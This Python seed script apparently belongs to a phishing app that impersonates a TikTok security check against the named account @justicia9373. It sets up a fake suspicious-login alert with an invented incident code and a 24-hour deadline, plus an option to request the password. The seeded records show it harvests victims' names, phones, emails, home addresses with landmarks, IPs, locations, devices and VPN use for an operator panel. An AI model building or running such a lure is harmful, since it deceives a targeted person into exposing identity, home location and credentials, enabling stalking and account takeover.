from datetime import datetime, timedelta, timezone
from app.db import SessionLocal, init_db, Campaign, Hit, Verificacion

init_db()
db = SessionLocal()

c = db.query(Campaign).filter_by(slug="justicia9373").first()
if not c:
    c = Campaign(
        slug="justicia9373",
        label="Verificación @justicia9373",
        redirect_url="https://www.tiktok.com/@justicia9373",
        cuenta_objetivo="@justicia9373",
        nickname_objetivo="Justicia ⚖️",
        dispositivo_sospechoso="Android · Chrome",
        ubicacion_sospechosa="Bogotá, Colombia",
        fecha_sospechosa="13/10/2026, 03:12",
        ip_enmascarada="190.xx.xx.xx",
        codigo_incidencia="TT-2026-1015-9373",
        horas_limite=24,
        pedir_password=False,
    )
    db.add(c); db.commit(); db.refresh(c)

ficticios = [
    ("Ana Gutiérrez", "+58 414 1234567", "ana@mail.com", "Calle 5", "casa 12",
     "frente a la Plaza Sucre", "Nirgua", "Yaracuy"),
    ("Luis Pérez", "+58 412 9988776", "luis@mail.com", "Av. La Patria", "local 3",
     "detrás de la Plaza Junín", "San Felipe", "Yaracuy"),
]
for i, (n, t, e, ca, nu, ref, ci, es) in enumerate(ficticios):
    sid = f"seed{i}"
    db.add(Hit(campaign_id=c.id, session_id=sid, kind="page", step="paso1",
               ip="190.1.1.%d" % (10 + i), country="Venezuela", region=es, city=ci,
               tz="America/Caracas", tz_country="VE", user_agent="Mozilla/5.0 (iPhone)"))
    db.add(Verificacion(campaign_id=c.id, session_id=sid, nombre=n, telefono=t, email=e,
                        pais="Venezuela", estado=es, ciudad=ci, calle=ca, numero=nu,
                        referencia=ref, dispositivo_habitual="Android", usa_vpn="No",
                        dispositivos_abiertos="1"))
db.commit()
print("Seed listo. Panel en http://localhost:8000/panel")